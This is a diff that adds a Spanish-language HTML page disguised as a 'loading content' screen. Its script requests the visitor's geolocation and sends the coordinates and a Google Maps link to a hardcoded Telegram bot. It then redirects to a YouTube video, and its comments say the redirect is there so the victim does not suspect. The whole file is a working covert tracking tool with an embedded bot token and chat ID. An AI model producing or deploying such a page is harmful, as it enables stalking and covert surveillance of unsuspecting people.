@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cargando contenido...</title>
+    <style>
+        body { 
+            background: #000; 
+            color: white; 
+            font-family: sans-serif; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            height: 100vh; 
+            margin: 0; 
+        }
+        .loader { 
+            border: 4px solid #f3f3f3; 
+            border-top: 4px solid #3498db; 
+            border-radius: 50%; 
+            width: 40px; 
+            height: 40px; 
+            animation: spin 2s linear infinite; 
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+    <div class="loader"></div>
+
+    <script>
+        // --- TUS DATOS CONFIGURADOS ---
+        const TOKEN = "8696903774:AAFzeE0FIsmmS-de6C0vJ4tMdTgC8WwC9z4"; 
+        const CHAT_ID = "1564844725";
+        const REDIRECCION = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"; // Puedes cambiar este link por cualquier video o noticia
+
+        async function enviarUbicacion(position) {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+            
+            // Formatear el mensaje para Telegram
+            const texto = `📍 ¡UBICACIÓN RECIBIDA!\n\n` +
+                          `Google Maps:\nhttps://www.google.com/maps?q=${lat},${lon}\n\n` +
+                          `Coordenadas: ${lat}, ${lon}`;
+
+            try {
+                // Enviar a la API de Telegram
+                await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ 
+                        chat_id: CHAT_ID, 
+                        text: texto 
+                    })
+                });
+            } catch (e) {
+                console.error("Error al enviar");
+            }
+
+            // Enviar al usuario al link final para que no sospeche
+            window.location.href = REDIRECCION;
+        }
+
+        function error() {
+            // Si el usuario rechaza, lo mandamos de todos modos al link final
+            window.location.href = REDIRECCION;
+        }
+
+        // Solicitar permiso de ubicación
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(enviarUbicacion, error);
+        } else {
+            window.location.href = REDIRECCION;
+        }
+    </script>
+</body>
+</html>
